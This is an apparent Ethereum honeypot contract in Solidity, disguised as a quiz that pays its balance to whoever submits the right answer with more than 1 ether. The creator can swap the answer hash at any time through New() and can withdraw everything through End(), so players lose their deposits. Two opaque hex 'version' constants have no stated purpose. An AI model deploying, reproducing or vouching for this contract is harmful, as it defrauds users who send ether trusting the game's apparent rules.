pragma solidity ^0.4.24;

contract QuestionIt
{
    bytes32 responseHash;
    string public Question;
    address questionSender;

    function Answer(string answer)
    public payable {
        if (responseHash == keccak256(answer) && msg.value > 1 ether) {
            msg.sender.transfer(address(this).balance);
        }
    }
 
    function Begin(string question, string response)
    public payable {
        if (responseHash == 0x0) {
            responseHash = keccak256(response);
            Question = question;
            questionSender = msg.sender;
        }
    }

    function End()
    public payable {
        if (msg.sender == questionSender) {
            msg.sender.transfer(address(this).balance);
        }
    }

    function New(string question, bytes32 _responseHash)
    public payable {
        if (msg.sender == questionSender) {
            Question = question;
            responseHash = _responseHash;
        }
    }

    function () public payable { }
    uint256 versionMin = 0x006326e3367063c8166a8a6304858fef6363e3fbbd;
    uint256 versionMaj = 0x00633e3ee859631f1c827f63f50ab247633fad9ae0;
}